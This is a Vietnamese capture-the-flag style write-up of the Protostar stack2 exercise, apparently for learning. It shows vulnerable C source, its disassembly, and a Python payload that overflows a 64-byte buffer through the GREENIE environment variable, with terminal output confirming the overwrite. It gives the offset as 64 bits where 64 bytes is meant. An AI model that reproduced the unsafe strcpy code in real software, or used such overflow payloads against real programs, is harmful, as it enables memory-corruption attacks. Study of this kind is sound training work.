## Stack2 
- Goal bài này vẫn là ghi đè biến `modified`, vẫn sử dụng hàm `strcpy`, chỉ khác là lần này untrusted data đến từ biến môi trường, cụ thể chương trình nhận vào data từ biến env `GREENIE` và `strcpy` vào `buffer`
- Source Code C:
```c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
- GDB `disass`:
```asm 
0x08048494 <main+0>:    push   ebp
0x08048495 <main+1>:    mov    ebp,esp
0x08048497 <main+3>:    and    esp,0xfffffff0
0x0804849a <main+6>:    sub    esp,0x60
0x0804849d <main+9>:    mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:   cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:   mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
0x080484c8 <main+52>:   mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:   mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:   lea    eax,[esp+0x18]
0x080484dc <main+72>:   mov    DWORD PTR [esp],eax
0x080484df <main+75>:   call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:   mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:   cmp    eax,0xd0a0d0a
0x080484ed <main+89>:   jne    0x80484fd <main+105>
0x080484ef <main+91>:   mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
0x080484fb <main+103>:  jmp    0x8048512 <main+126>
0x080484fd <main+105>:  mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:  mov    eax,0x8048641
0x08048506 <main+114>:  mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:  mov    DWORD PTR [esp],eax
0x0804850d <main+121>:  call   0x80483ac <printf@plt>
0x08048512 <main+126>:  leave  
0x08048513 <main+127>:  ret    
```
- Bằng cách cũ ta vẫn xác định được offset của `modified` và `buffer` là 64 bit, nhưng lần này ta sẽ cần set biến môi trường `GREENIE` bằng `0x0d0a0d0a`
- Craft payload bằng python với 64 chữ A và 4 bytes `\x0a\x0d\x0a\x0d` rồi set cho biến `$GREENIE`
```
export GREENIE="$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"')"
```
- Mình có thử dùng nhiều cách như đưa 4 bytes kia vào files rồi cat ra, dùng `setenv` của C nhưng không được, cách duy nhất mình tìm ra là dùng python đưa trực tiếp vào
```bash 
user@protostar:/opt/protostar/bin$ echo $GREENIE 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
user@protostar:/opt/protostar/bin$ export GREENIE="$(python -c 'print "A"*64 + "\x0a\x0d\x0a\x0d"')"
user@protostar:/opt/protostar/bin$ ./stack2 
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ 
```
